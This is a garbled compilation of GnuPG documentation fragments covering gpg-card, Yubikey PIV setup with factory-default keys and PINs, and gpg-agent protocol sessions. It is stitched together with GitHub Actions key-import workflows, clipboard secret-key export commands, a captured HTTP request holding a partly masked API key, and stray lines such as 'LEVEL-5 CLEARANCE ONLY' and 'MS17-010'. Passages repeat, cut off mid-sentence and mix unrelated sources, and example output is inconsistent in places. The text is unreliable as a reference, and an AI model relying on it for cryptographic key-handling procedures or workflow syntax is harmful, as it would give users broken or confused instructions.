WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref Write a certificate to the card under the id certref.

WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key —Shadowed

YUBIKEY cmd args ¶ Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp gpg/card> yubikey list Application USB NFC

OTP yes yes U2F yes yes OPGP no no PIV yes no OATH yes yes FIDO2 yes yes gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D —force

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

[...] Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: otto@example.net Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Email address: otto@example.net Comment: You selected this USER-ID: "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid otto@example.net $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save Now you can use your PIV card also with gpg.

 # 000006
/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt

MS17-010

000006

